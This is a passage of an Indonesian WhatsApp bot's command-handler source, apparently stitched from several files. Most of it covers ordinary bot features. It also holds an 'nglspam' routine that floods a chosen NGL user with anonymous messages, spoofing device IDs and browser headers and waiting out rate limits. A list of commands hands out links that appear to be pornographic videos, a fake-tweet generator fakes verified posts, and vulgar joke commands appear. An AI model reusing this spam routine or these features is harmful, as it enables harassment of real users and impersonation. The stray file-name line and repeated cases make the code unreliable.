Ditss.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break

case 'tolink': {
if (!/video/.test(mime) && !/image/.test(mime)) Reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) Reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
let { TelegraPh } = require('../all/uploader.js')
let media = await Ditss.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
Reply(util.format(anu))
await fs.unlinkSync(media)
}
break

///////listtbokepp////////
case "listbkp":{
Reply('ada 20 bkp ketik contoh : bkp1')
}
break
case "bkp1":{
Reply('https://videy.co/v?id=yUI9qHxy1')
}
break
case "bkp2":{
Reply('https://videy.co/v?id=taEdfX521')
}
break
case "bkp3":{
Reply('https://videy.co/v?id=IZ2dEEPR1')
}
break
case "bkp4":{
Reply('https://videy.co/v?id=cFmHXLnR1')
}
break
case "bkp5":{
Reply('https://videy.co/v?id=VkhX0rIY1')
}
break
case "bkp6":{
Reply('https://videy.co/v?id=HbciV3Ng1')
}
break
case "bkp7":{
Reply('https://videy.co/v?id=iDZaNE341')
}
break
case "bkp8":{
Reply('https://videy.co/v?id=99FZhvO21')
}
break
case "bkp9":{
Reply('https://videy.co/v?id=5JeZNWaH1')
}
break
case "bkp10":{
Reply('https://videy.co/v?id=KTw1lWWa1')
}
break
case "bkp11":{
Reply('https://videy.co/v?id=UdqYuonc1')
}
break
case "bkp12":{
Reply('https://videy.co/v?id=vApGwZAC1')
}
break
case "bkp13":{
Reply('https://videy.co/v?id=ji0jr2f71')
}
break
case "bkp14":{
Reply('https://videy.co/v?id=kxx94sEr1')
}
break
case "bkp15":{
Reply('https://videy.co/v?id=jRlBDROc1')
}
break
case "bkp16":{
Reply('https://videy.co/v?id=LevNyK2x1')
}
break
case "bkp17":{
Reply('https://videy.co/v?id=a1Uim8Ey')
}
break
case "bkp18":{
Reply('https://videyvideo.short.gy/Cwdcj1')
}
break
case "bkp19":{
Reply('https://videy.co/v?id=bliIEHfL1')
}
break
case "bkp20":{
Reply('https://videy.co/v?id=Yep64SD61')
}
break
///==============///////////////////



case 'kivotos': {
//if (!isPremium && !isPremium) return Reply(mess.prem)
if (!text) return Reply('Contoh: .kivotos hutao genshin impact, modern')
await Ditss.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
m.reply('tunggu 30 detik.')
try {
await Ditss.sendMessage(m.chat, { image : { url : `https://render.neekoi.me/kivotos?${text}=${full_args}` }, caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${full_args}` }, { quoted: m })
} catch (err) {
//m.reply(err)
}
await Ditss.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
}
break

// FITUR SOUND
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
let bangsat = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await Ditss.sendMessage(from, { audio: bangsat, mimetype: 'audio/mp4', ptt: true, viewOnce: true, contextInfo:{ externalAdReply: { showAdAttribution: false,
mediaType: 2,
mediaUrl: `https://wa.me/${global.owner}`,
title: `${command}`,
sourceUrl: `${global.saluran}`,
thumbnail: ppuser,
renderLargerThumbnail: false,
}
}})
break

case 'getpp':
if (m.quoted || q) {
let pporang = await Ditss.profilePictureUrl(froms, 'image').catch(_ => m.reply('Profile di private!'))
if (pporang) return Ditss.sendMessage(from, {image: {url:pporang}, caption: 'Nih!'}, {quoted:m})
} else Reply('Tag atau reply pesan target!')
break

case 'daftar':
if (!q.includes('.')) return Reply('*Format salah! Gunakan Dengan*\n\n *Contoh :* .daftar dits.16')
const namaUser = q.substring(0, q.indexOf('.') - 0)
const umurUser = q.substring(q.lastIndexOf('.') + 1)
const serialUser = createSerial(20)
if(isNaN(umurUser)) return m.reply('Umur harus berupa angka!!')
if (namaUser.length >= 30) return m.reply(`why is your name so long it's a name or a train`)
if (umurUser > 40) return m.reply(`your age is too old maximum 40 years`)
if (umurUser < 12) return m.reply(`your age is too young minimum 12 years`)
let mzd = `*REGISTRATION SUCCESSFUL*\n\n⎋ Nama : ${namaUser}\n⎋ Umur : ${umurUser}\n⎋ Nomor : @${m.sender.split("@")[0]}\n⎋ Premium : ${isPremium}\n⎋ Limit : ${limit}\n⎋ Register : ${calender}`
let veri = m.sender
if (!m.isGroup) {
addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
Ditss.sendMessage(from, {image: ppuser, caption: mzd, fileLength: 9999778866, contextInfo: {
externalAdReply: {
showAdAttribution: true, 
mediaType: 1, 
previewType: 'PHOTO',
renderLargerThumbnail: false, 
title: `${namaUser} registered ✅`, 
body: `powered by Dits`, 
description: 'no text',
mediaType: 1,
thumbnail: ppuser,
sourceUrl: `${global.saluran}`,
}}
})
} else {
addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
Ditss.sendMessage(from, {image: ppuser, caption: mzd, fileLength: 9999778866, contextInfo: {
externalAdReply: {
showAdAttribution: true, 
mediaType: 1, 
previewType: 'PHOTO',
renderLargerThumbnail: false, 
title: `${namaUser} Terdaftar ✅`, 
body: `powered by Dits`, 
description: 'no text',
mediaType: 1,
thumbnail: ppuser,
sourceUrl: `${global.linkSaluran}`,
}}
})
}
break
 case 'aiimg':
        case 'diff':
        case 'txt2img':
        {
        if(!text) return reply('Mau Buat Gambar Apa Sayang?');                
        try {
        let aii = await getBuffer(`https://api.betabotz.eu.org/api/search/openai-image?text=${text}&logic=${logic}&apikey=${global.api}`);
        Ditss.sendMessage(m.chat, { image : aii }, { quoted: m });;
        } catch ( err ) {
        console.error(err);
        reply(mess.error);
        }
        }
        break

case 'brat':{
if (!q) return Reply(`Masukan Teks\n\nexample ${prefix}brat lanasad`)
let res = await getBuffer(`https://btch.us.kg/brat?text=${text}`)
let repl = "> _`waitt sedang mengirimkan sticker & image KALAU TIDAK MUNCUL KETIK brat2....`_"
m.reply(repl)
await sleep(3000)
try {
Ditss.sendAsSticker(m.chat, res, m, { packname: `HiraaXz`, author: `HangzMD\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
 await sleep(2000)
 Ditss.sendMessage(from, { image: {url: res}, caption: `done`}, { quoted: m })
 
} catch (e) {
 console.log(e);
 await m.reply(`Api Sedang Error`)
 }
}
break


case 'faketweet':{
const canvafy = require('canvafy')
if (!text) return Reply(`Exmaple : Name1 | Name2 | Text`)
 nama1 = text.split("|")[0]
 nama2 = text.split("|")[1]
 katakata = text.split("|")[2]
const tweet = await new canvafy.Tweet()
 .setTheme("dim")
 .setUser({displayName: nama1, username: nama2})
 .setVerified(true)
 .setComment(katakata)
 .setAvatar(ppuser)
 .build();
 let tanaka = tweet
 Ditss.sendMessage(m.chat, { image: tanaka, caption: 'Done' },{ quoted : m }) 
}
break

case 'ceksider': case 'sider': case 'gcsider': {
if (!(isCreator && isAdmins)) return Reply(`Khusus admin`)
if (!m.isGroup) return Reply(mess.group)
var lama = 86400000 * 7 
const now = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" })
const milliseconds = new Date(now).getTime()
const groupMetadata = await Ditss.groupMetadata(m.chat);
let member = groupMetadata.participants.map(v => v.id)
var pesan = q || "Harap aktif di grup karena akan ada pembersihan member setiap saat"
var total = 0
var sider = []
for (let i = 0; i < member.length; i++) {
let user = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
let userData = global.db.data.users[member[i]]
if (
 (!userData || milliseconds - userData.lastseen > lama)
&& !user.isAdmin
&& !user.isSuperAdmin
) {
total++
sider.push(member[i])
}
}
if (total == 0) return Reply(`*Digrup ini tidak terdapat sider.*`)
Reply(`*${total}/${member.length}* anggota grup *${groupMetadata.subject}* adalah sider dengan alasan:\n1. Tidak aktif selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah nimbrung\n\n_“${pesan}”_\n\n*LIST SIDER:*\n${sider.map(v => ' ○ @' + v.replace(/@.+/, '') + ' (' + (global.db.users[v] ? msToDate(milliseconds - global.db.users[v].lastseen) : 'Tidak Ada Data') + ')').join('\n')}`, m, {
contextInfo: {
mentionedJid: sider
}
})
}
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
function msToDate(ms) {
let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
return `${d}H ${h}J ${m}M`
}
break
//batas kontol
case 'kick-sider': case 'kicksider': {
if (!(isCreator && isAdmins)) return Reply(`Khusus admin`)
if (!m.isGroup) return Reply(mess.group)
var lama = 86400000 * 7 
const now = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" })
const milliseconds = new Date(now).getTime()
const groupMetadata = await Ditss.groupMetadata(m.chat);
let member = groupMetadata.participants.map(v => v.id)
var pesan = q || "Harap aktif di grup karena akan ada pembersihan member setiap saat"
var total = 0
var sider = []
for (let i = 0; i < member.length; i++) {
let user = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
let userData = global.db.users[member[i]]
if (
(!userData || milliseconds - userData.lastseen > lama) 
&& !user.isAdmin 
&& !user.isSuperAdmin
) {
total++
sider.push(member[i])
}
}
if (total == 0) return reply(`*Digrup ini tidak terdapat sider.*`)
reply(`*${total}/${member.length}* anggota grup *${groupMetadata.subject}* adalah sider dan akan dikeluarkan:\n\n*LIST SIDER:*\n${sider.map(v => ' ○ @' + v.replace(/@.+/, '') + ' (' + (global.db.data.users[v] ? msToDate(milliseconds - global.db.data.users[v].lastseen) : 'Tidak Ada Data') + ')').join('\n')}`, m, {
contextInfo: {
mentionedJid: sider
}
})
for (let i = 0; i < sider.length; i++) {
await Ditss.groupParticipantsUpdate(m.chat, [sider[i]], 'remove')
}
}
const more2 = String.fromCharCode(8206)
const readMore2 = more.repeat(4001)
function msToDate(ms) {
 let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
 let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
 let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
 return `${d}H ${h}J ${m}M`
}
break

case'promoteall':
if (!isCreator) return m.reply('Only Creator...')
if (!m.isGroup) return onlyGroup()
if (!m.isAdmin && !isCreator) return m.Reply('khusus atmin')
if (!m.isBotAdmin) return m.reply('bot kudu atmin')
var groupe = await Ditss.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Ditss.groupParticipantsUpdate(from, mems, 'promote')
break

case 'demoteall':{
//powered by dits
if (!isCreator && !isPremium) return (mess.owner)
Reply(global.mess.wait)
let data = groupAdmins.splice(botNumber, groupAdmins.length - 1)
await Ditss.groupParticipantsUpdate(m.chat, data, 'demote')
}
break

case 'totalcase': case 'listcase': case 'listfitur':{
const listCase = () => {
const code = fs.readFileSync("./case.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}
let teks = `*Total Case*: ${matches.length} \n\n` 
matches.forEach(function (x) {
 teks += `╰◈ ${prefix}` + x + "\n"
})
return teks
}
Reply(listCase())
}
break

case 'pler':
			case 'cekkontol':
			case 'cekpepek':
			case'cekpler':	
if (!q) return Reply('Mana Nama?')
				
	const persenbucin1 = text
 const bucin1 =
 ["Hadehh🤦\n[ dah Item Bauk Lagi ishh🤮 ]","9%\n\nmasih kecil Ini mah ketutup ama bulu kont nya🗿 Ae","nakk Masih Kecil","28%\n\nyoalahh hmm","34%\n\nmayan Lah","48%\n\ngatau","59%\n\nbiasa Kang Coli mah tityd nya Item🗿","apacoba\nkasian mana Masih Muda","itu tityd apa terong"," Ya ympun🗿"]
				const tetot2 = bucin1[Math.floor(Math.random() * bucin1.length)]
 Ditss.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${pushname} si jembut⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./media/thumb.jpg"),sourceUrl: global.linkSaluran,}
}, 
text : 'cekkontlo🗿: *'+persenbucin1+'*\n\nJawaban : '+ tetot2}, { quoted: qtext })
				break



case 'minsaldo':
if (!isCreator) return Reply(`khusus sepuhh`)
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah`)
const Kalender010 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
Reply(`*USER SALDO*
 • ID : ${q.split(",")[0]}
 • Nomor : ${q.split(",")[0]}
 • Tanggal : ${Kalender010}
 • Saldo : Rp ${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break

case 'cekmin':
if (!text) return Reply('reply bukti pembayaran anda\n\ncontoh : .cekmin udah topup 40ribu')
if ((!isImage) || !isQuotedImage) {
try {
let media = await quoted.download()
m.reply('pesan dikirim ke owner, tunggu owner *acc* saldo anda')
await sleep(100)
Ditss.sendMessage(global.owner, { image: media, caption: `${text}`}, { quoted: m})
} catch (err) {
m.reply(`Gambar tidak di temukan!\nCoba untuk ulangi kirim/reply gambar dengan caption ${prefix+command}`)
}
} else Reply(`Kirim/reply gambar dengan caption ${prefix+command}`)
break

case 'plerr':{
Reply('🗿🥸')
}
break
////====================/////HiraaXz
case 'myip': {
var http = require('http')
 http.get({
 'host': 'api.ipify.org',
 'port': 80,
 'path': '/'
 }, function(resp) {
 resp.on('data', function(ip) {
 m.reply("🔎 My public IP address is: " + ip);
 })
 })}
break
/////////===============////////
case 'asuma': {
const ditsganteng = "https://cih-cai-jir.koi.pics/newchat?id=_XjlY1xn-xKyZ453zDa2boJ51fMfO3oV6qyTvds9BSM";
let y = await fetchJson(ditsganteng);
Ditss.sendMessage(m.chat, {text: y.status}, {quoted:qkontak})
}
break

case 'pew':{
Reply(`${ucapanWaktu}`)
}

rpg.js

case 'gacha': case 'spin':
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 // mahkota
 const spingc = () => {

let token1 = [1,2,3,4,9,2,5,2,7,1,6,2,2,6,2,8,4,1,2,3,4,4,5,2,3,2]
let token2 = [1,1,1,1,1,0,2,2,2,2,0,0,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,1,1,1,2,1,1,2,1,1,2,2,2,1,1,1,1,1,2,1,1,2,1,1,2,1,0,0,1,1,1,1,1,1,1,2,1,2,1,0,0,1,1,1,1,2,1,1,0,0,2,2,2,1,1,1,2,1,1,1,1,0,2,2,0,1,1,1]
var mahkkkkk = token1[Math.floor(Math.random() * token1.length)]
var mahkkkkkkk = token2[Math.floor(Math.random() * token2.length)]
if (istoken < 5) return reply('Token spin Habis Kerja lah dan beli token lagi')
 if (mahkkkkkkk === 0) {
 reply(`Mendapatkan ${mahkkkkk} Digitrails Token`)
 } else if (mahkkkkkkk === 1) {
reply(`Mahkota Terkoleksi -> ${mahkkkkk} Item`)
 addMahkota(m.sender, mahkkkkk)
 } else if (mahkkkkkkk === 2) {
 reply(`Cho-cho Energy Terkoleksi -> ${mahkkkkk} Item`)
 addCho(m.sender, mahkkkkk)
 }
}
 let mahko = [1,2,0,0,2,0,0,0,2,0,1,0,1,0,0,1,0,0,2,1,0,0,0,2,0,0,2,0,0,0,1,0,0,2,0,0,0,1,2,0,1,1,0,0,0,0,0,2,0,1,0,0,0,1,0,0,2,0,0,1,0,0,1,1,0,2,0,0,0,1,1,0,0,2,0,2,1,0,1,0,2,0,0,0,1,0,0,1,0,0,1,0,0,1,0,0,2,0,,0,0,0,2,0,0,1,1,0,0,0,1,1,0,0,0,1,0,1,1,0,0,1,1,0,0,0,1,1,0,0,0,1,0,0,0,1,2,0,0,1,2,0,0,0] // Rare math
var mahk = mahko[Math.floor(Math.random() * mahko.length)]
let token1 = [1,2,3,2,2,7,1,6,2,2,6,2,4,1,2,3,4,4,5,2,3,2]
let token2 = [1,1,1,1,1,0,2,2,2,2,0,0,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,1,1,1,2,1,1,2,1,1,2,2,2,1,1,1,1,1,2,1,1,2,1,1,2,1,0,0,1,1,1,1,1,1,1,2,1,2,1,0,0,1,1,1,1,2,1,1,0,0,2,2,2,1,1,1,2,1,1,1,1,0,2,2,0,1,1,1]
var mahkk = token1[Math.floor(Math.random() * token1.length)]
var mahkkk = token2[Math.floor(Math.random() * token2.length)]
if (args[0] === 'extra'){
 if (istoken < 5) return reply('Token spin Habis Kerja lah dan beli token lagi')
await loading()
 setTimeout(async () => {
 spingc()
 }, 1300)
 setTimeout(async () => {
 spingc()
 }, 1300)
 setTimeout(async () => {
 spingc()
 }, 1300)
 setTimeout(async () => {
 spingc()
 }, 1300)
 setTimeout(async () => {
 spingc()
 }, 1300)
 } else
 if (args[0] === 'normal'){
 
 if (istoken < 1) return reply('Token spin Habis Kerja lah dan beli token lagi')
 await loading()
 if (mahk === 0) {
 reply(`Mendapatkan ${mahkk} Digitrails Token`)
 } else if (mahk === 1) {
reply(`Mahkota Terkoleksi -> ${mahkk} Item`)
 addMahkota(m.sender, mahkk)
 } else if (mahk === 2) {
 reply(`Cho-cho Energy Terkoleksi -> ${mahkk} Item`)
 addCho(m.sender, mahkk)
 
 }
 } else 
 if (args[0] === 'free') {
 let user = global.db.data.users[m.sender];
 if (new Date() - user.lasttokenn < 3600000) {
 m?.reply( '⏰ Anda hanya dapat gratis spin sekali dalam 1 jam.');
 return;
 }
 user.lasttokenn = new Date(); 
 if (mahk === 0) {
 reply(`Mendapatkan ${mahkk} Digitrails Token`)
 } else if (mahk === 1) {
reply(`Mahkota Terkoleksi -> ${mahkk} Item`)
 addMahkota(m.sender, mahkk)
 } else if (mahk === 2) {
 reply(`Cho-cho Energy Terkoleksi -> ${mahkk} Item`)
 addCho(m.sender, mahkk)
 }
 let cooldownn = 3600000; 
 user.kuldontokenn = new Date() * 1 + cooldownn;
 } else {
 reply('*`[ PILIH - SPIN ]`*\n> • Free *<24h limit>*\n> • Normal *<1x spin>*\n> • Extra *<5x spin>*\n\nExample : .spin free')
 
 }
 break
 ////==========brat2========{{{{\//////////////
 case "brat2": {
if (!text) return m.reply(example('teksnya'))
let res = await getBuffer(`https://btch.us.kg/brat?text=${text}`)
await Ditss.sendAsSticker(m.chat, res, m, {packname: global.packname})
}
break
///=======jokowi======\\\\\\\
case 'joko':{
 if (!text) {
 return m.reply("Tidak ada pembicaraan yang ditemukan.");
 }
 try {
 const response = await axios.get("https://api.siputzx.my.id/api/ai/joko?content=" + text);
 const audioUrl = `https://api.siputzx.my.id/api/tools/tts?voice=jv-ID-DimasNeural&rate=0&pitch=0&volume=0&text=${response.data.data}`;
 await Ditss.sendMessage(m.chat, { mimetype: 'audio/mp4', audio: { url: audioUrl } }, { quoted: m });
 } catch (error) {
 //m.reply("Terjadi kesalahan saat memproses permintaan.");
 }
 }
 break
 //======faketwetputih===/////////
case "twt": {
if (!text) return m.reply("Masukan teksnya!")
try {
 ppser = await Ditss.profilePictureUrl(m.sender, 'image');
} catch (e) {
 ppser = 'https://telegra.ph/file/68d47ac90bcc8ef1510fa.jpg';
}
let { data } = await axios.post('https://ruloaooa-swgen.hf.space/generate2', {
 avatar: ppser,
 username: m.pushName,
 text: text,
 countLike: (Math.floor(Math.random() * 10000))
}, { responseType: 'arraybuffer' })
Ditss.sendMessage(m.chat, { image: data })
}
break
/////////======================///////////

case 'fajar':


FajarNews().then(async(res) => {
console.log(res) 
no = 0
iwan = ""
for (let i of res) {
no += 1
iwan += `\n• ${no.toString()} •\n`
iwan += `Berita: ${i.berita}\n`
iwan += `Upload: ${i.berita_diupload}\n`
iwan += `Jenis: ${i.berita_jenis}\n`
iwan += `Link: ${i.berita_url}\n`
}
iwan += ""
reply(iwan) 
})
break

case'z': case 'everyone': 
     if (!text) return m.reply("teks?")
 if (!isAdmins && !isCreator) return
 Ditss.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await Ditss.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: `${text}`
}
]
}
}
)
 setTimeout(async () => {
// reply(`${pushname} memggunakan ${command} untuk memanggil kalian`)
 }, 1120)
 break

case 'toqr':{
//if (!isRegistered) return registerbut(noregis)
if (!q) return reply('bloon')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
let qyuer = await qrcode.toDataURL(q, { scale: 35 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
let buff = getRandom('.jpg')
await fs.writeFileSync('./'+buff, data)
let medi = fs.readFileSync('./' + buff)
await Ditss.sendMessage(from, { image: medi, caption:"nih"}, { quoted: qkontak })
setTimeout(() => { fs.unlinkSync(buff) }, 10000)
}
break

case 'detekqr': case 'liatqr':case "detectqr":
if (/image\/(jpe?g|png)/.test(mime)) {
mee = await Ditss.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
const res123 = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const datas = await res123.json() 
reply(util.format(datas[0]))
} else reply(`Reply Image Yang Ada Qr Nya`)
break

case 'nglspam': {
if (!isCreator && !isPremium) return reply(mess.prem)
 if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
 return m.reply("Masukan username, pesan, dan jumlah spam!\nContoh: .nglspam ditss|haloo|5");
 }
async function sendSpamMessage(username, message, spamCount) {
 let counter = 0;
 while (counter < spamCount) {
 try {
 const date = new Date();
 const minutes = date.getMinutes();
 const hours = date.getHours();
 const formattedDate = `${hours}:${minutes}`;
 const deviceId = crypto.randomBytes(21).toString('hex');
 const url = 'https://ngl.link/api/submit';
 const headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
 'Accept': '*/*',
 'Accept-Language': 'en-US,en;q=0.5',
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'X-Requested-With': 'XMLHttpRequest',
 'Sec-Fetch-Dest': 'empty',
 'Sec-Fetch-Mode': 'cors',
 'Sec-Fetch-Site': 'same-origin',
 'Referer': `https://ngl.link/${username}`,
 'Origin': 'https://ngl.link'
 };
 const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

 const response = await fetch(url, {
 method: 'POST',
 headers,
 body,
 mode: 'cors',
 credentials: 'include'
 });

 if (response.status !== 200) {
 console.log(`[${formattedDate}] [Err] Ratelimited`);
 await new Promise(resolve => setTimeout(resolve, 25000));
 } else {
 counter++;
 console.log(`[${formattedDate}] [Msg] Sent: ${counter}`);
 }
 } catch (error) {
 console.error(`[${formattedDate}] [Err] ${error}`);
 await new Promise(resolve => setTimeout(resolve, 5000));
 }
 }
};
 const [username, message, count] = text.split("|");
 const spamCount = parseInt(count, 10);

 if (isNaN(spamCount) || spamCount <= 0) {
 return m.reply("Jumlah spam harus berupa angka positif!");
 }

 try {
 await sendSpamMessage(username, message, spamCount);
 m.reply(`Sukses mengirim ${spamCount} pesan NGL ke ${username}`);
 } catch (e) {
 console.error(e); // Menambahkan logging error untuk debug
 return m.reply("Fitur error, coba lagi nanti.");
 }
}
break

case 'banned': case 'ban':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (m.quoted || q) {
if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (db.users[froms].banned) return reply('Udah banned!')
db.users[froms].banned = true
reply(`Berhasil banned *${db.users[froms].name}*`)
} else reply('tag atau reply pesan target!')
break

case 'unbanned': case 'unban':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (m.quoted || q) {
if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (!db.users[froms].banned) return reply('Udah unbanned!')
db.users[froms].banned = false
reply(`Berhasil menghapus *${db.users[froms].name}* dari daftar banned`)
} else reply('Tag atau reply pesan target!')
break

case 'unbanned': case 'unban':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (m.quoted || q) {
